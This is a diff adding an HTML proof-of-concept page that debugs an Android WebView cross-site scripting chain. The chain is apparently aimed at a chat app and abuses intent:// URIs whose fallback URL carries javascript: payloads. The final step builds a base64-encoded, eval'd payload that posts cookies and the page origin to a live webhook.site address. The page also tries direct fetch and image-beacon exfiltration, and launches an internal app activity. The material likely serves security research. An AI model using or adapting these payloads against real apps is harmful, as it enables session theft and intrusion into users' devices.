@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>XSS Debug</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 12px; font-size: 12px; }
+h1 { color: #f00; }
+h2 { color: #0ff; font-size: 13px; margin-top: 16px; }
+.info { color: #ff0; }
+.ok { color: #0f0; font-weight: bold; }
+.fail { color: #f55; }
+.critical { color: #f00; font-weight: bold; }
+button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px 12px; margin: 4px; font-family: monospace; cursor: pointer; font-size: 12px; display: block; width: 100%; }
+.btn-red { background: #600; border-color: #f00; color: #ff0; }
+#log { white-space: pre-wrap; background: #000; padding: 8px; border: 1px solid #333; max-height: 50vh; overflow-y: auto; margin-top: 8px; font-size: 11px; word-break: break-all; }
+</style>
+</head>
+<body>
+
+<h1>XSS Debug PoC</h1>
+<p class="info">Testing each step to find where the chain breaks</p>
+
+<h2>Step 0: Network test (no intent:// needed)</h2>
+<button onclick="testDirectFetch()">0a. Direct fetch to webhook.site</button>
+<button onclick="testDirectBeacon()">0b. Image beacon to webhook.site</button>
+
+<h2>Step 1: Simplest javascript: via intent:// fallback</h2>
+<p class="info">If title changes, javascript: works via loadUrl()</p>
+<button onclick="testSimpleXSS()">1a. javascript:void(document.title='XSS_WORKS')</button>
+<button onclick="testConsoleLog()">1b. javascript:console.log('XSS') (check logcat)</button>
+
+<h2>Step 2: Alternative triggers</h2>
+<p class="info">Maybe window.location.href causes issues - try other methods</p>
+<button onclick="testAnchorClick()">2a. &lt;a href="intent://"&gt; click (programmatic)</button>
+<button onclick="testIframe()">2b. iframe src="intent://"</button>
+
+<h2>Step 3: Verify intent:// resolves correctly</h2>
+<button onclick="testKnownGood()">3a. Known-good: launch StorageUsageActivity</button>
+<button onclick="testFallbackSimple()">3b. Fallback: load https://example.com as fallback</button>
+
+<h2>Step 4: Full exfil chain (if Step 1 works)</h2>
+<button class="btn-red" onclick="testFullExfil()">4a. Full webhook exfil via javascript:</button>
+
+<div id="log"></div>
+
+<script>
+var logEl = document.getElementById('log');
+function L(cls, msg) {
+    var d = document.createElement('div');
+    d.style.color = ({ok:'#0f0',fail:'#f55',info:'#ff0',critical:'#f00'})[cls] || '#0f0';
+    if (cls === 'critical' || cls === 'ok') d.style.fontWeight = 'bold';
+    d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    logEl.appendChild(d);
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+var WEBHOOK = 'https://webhook.site/9556e669-143e-4418-97c8-561b1633b6d1';
+
+// ===== STEP 0: Direct network test =====
+function testDirectFetch() {
+    L('info', '=== 0a: Direct fetch to webhook.site ===');
+    L('info', 'No intent:// chain - just testing if network works from WebView');
+
+    fetch(WEBHOOK, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            test: 'direct_fetch',
+            origin: location.origin,
+            url: location.href,
+            ua: navigator.userAgent,
+            ts: new Date().toISOString()
+        })
+    }).then(function(r) {
+        L('ok', 'FETCH SUCCESS: HTTP ' + r.status + ' ' + r.statusText);
+        L('ok', 'Check webhook.site for the POST');
+    }).catch(function(e) {
+        L('fail', 'FETCH FAILED: ' + e.message);
+        L('info', 'This means CORS or network is blocking outbound requests');
+    });
+}
+
+function testDirectBeacon() {
+    L('info', '=== 0b: Image beacon to webhook.site ===');
+    var data = encodeURIComponent(JSON.stringify({test:'beacon',ts:new Date().toISOString()}));
+    var img = new Image();
+    img.onload = function() { L('ok', 'IMAGE LOADED (webhook received data)'); };
+    img.onerror = function() { L('info', 'Image onerror fired (but data may still have been sent - check webhook)'); };
+    img.src = WEBHOOK + '?beacon=' + data;
+    L('info', 'Beacon sent - check webhook.site');
+}
+
+// ===== STEP 1: Simplest javascript: =====
+function testSimpleXSS() {
+    L('info', '=== 1a: Simplest javascript: test ===');
+    L('info', 'Before: document.title = "' + document.title + '"');
+    L('info', 'Setting window.location.href to intent:// with javascript: fallback...');
+
+    // Simplest possible: no btoa, no complex payload
+    var uri = "intent://x#Intent;package=com.fake.nonexist.zzzzz;S.browser_fallback_url=javascript:void(document.title='XSS_WORKS_'+Date.now());end";
+
+    L('info', 'URI: ' + uri);
+    window.location.href = uri;
+
+    // Check after delay
+    setTimeout(function() {
+        var newTitle = document.title;
+        if (newTitle.indexOf('XSS_WORKS') !== -1) {
+            L('critical', 'XSS CONFIRMED! Title changed to: ' + newTitle);
+        } else {
+            L('fail', 'XSS DID NOT WORK. Title still: ' + newTitle);
+            L('info', 'loadUrl("javascript:...") from shouldOverrideUrlLoading may be silently dropped');
+        }
+    }, 3000);
+}
+
+function testConsoleLog() {
+    L('info', '=== 1b: console.log via javascript: ===');
+    L('info', 'Check logcat for chromium console messages');
+
+    var uri = "intent://x#Intent;package=com.fake.nonexist.zzzzz;S.browser_fallback_url=javascript:void(console.log('XSS_FROM_FALLBACK_URL_'+Date.now()));end";
+    window.location.href = uri;
+    L('info', 'Sent. Check: adb logcat -s chromium:V');
+}
+
+// ===== STEP 2: Alternative triggers =====
+function testAnchorClick() {
+    L('info', '=== 2a: <a> click trigger ===');
+    L('info', 'Creating anchor element and clicking it...');
+
+    var a = document.createElement('a');
+    a.href = "intent://x#Intent;package=com.fake.nonexist.zzzzz;S.browser_fallback_url=javascript:void(document.title='XSS_ANCHOR_'+Date.now());end";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+
+    setTimeout(function() {
+        if (document.title.indexOf('XSS_ANCHOR') !== -1) {
+            L('critical', 'XSS via anchor click WORKS! Title: ' + document.title);
+        } else {
+            L('fail', 'Anchor click: title unchanged = ' + document.title);
+        }
+    }, 3000);
+}
+
+function testIframe() {
+    L('info', '=== 2b: iframe trigger ===');
+    var iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = "intent://x#Intent;package=com.fake.nonexist.zzzzz;S.browser_fallback_url=javascript:void(parent.document.title='XSS_IFRAME_'+Date.now());end";
+    document.body.appendChild(iframe);
+
+    setTimeout(function() {
+        if (document.title.indexOf('XSS_IFRAME') !== -1) {
+            L('critical', 'XSS via iframe WORKS! Title: ' + document.title);
+        } else {
+            L('fail', 'Iframe: title unchanged = ' + document.title);
+        }
+        document.body.removeChild(iframe);
+    }, 3000);
+}
+
+// ===== STEP 3: Verify intent:// =====
+function testKnownGood() {
+    L('info', '=== 3a: Known-good activity launch ===');
+    var uri = 'intent:#Intent;component=com.aratai.chat/com.arattai.chats.presentation.ui.StorageUsageActivity;end';
+    L('info', 'Launching StorageUsageActivity (previously confirmed working)');
+    window.location.href = uri;
+}
+
+function testFallbackSimple() {
+    L('info', '=== 3b: Fallback URL with https:// ===');
+    L('info', 'Testing if fallback URL is even loaded at all (not javascript:, just https://)');
+    L('info', 'If this navigates to example.com, the fallback path works');
+
+    var uri = "intent://x#Intent;package=com.fake.nonexist.zzzzz;S.browser_fallback_url=https://example.com;end";
+    window.location.href = uri;
+    L('info', 'If page navigates away to example.com, fallback URL loading works');
+}
+
+// ===== STEP 4: Full exfil =====
+function testFullExfil() {
+    L('info', '=== 4a: Full webhook exfil ===');
+    L('info', 'Only try this AFTER confirming Step 1 works');
+
+    document.cookie = 'poc_token=SECRET_12345';
+
+    var code = 'fetch("' + WEBHOOK + '",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({xss:true,cookies:document.cookie,origin:location.origin,ts:new Date().toISOString()})}).catch(function(e){new Image().src="' + WEBHOOK + '?e="+e.message})';
+
+    var uri = "intent://x#Intent;package=com.fake.nonexist.zzzzz;S.browser_fallback_url=javascript:eval(atob('" + btoa(code) + "'));end";
+    L('critical', 'Sending...');
+    window.location.href = uri;
+}
+
+// ===== Init =====
+L('info', '=== XSS Debug PoC ===');
+L('info', 'Test in order: 0a first (verify network), then 1a (verify XSS)');
+L('info', 'Page: ' + location.href);
+L('info', 'Title: ' + document.title);
+</script>
+
+</body>
+</html>
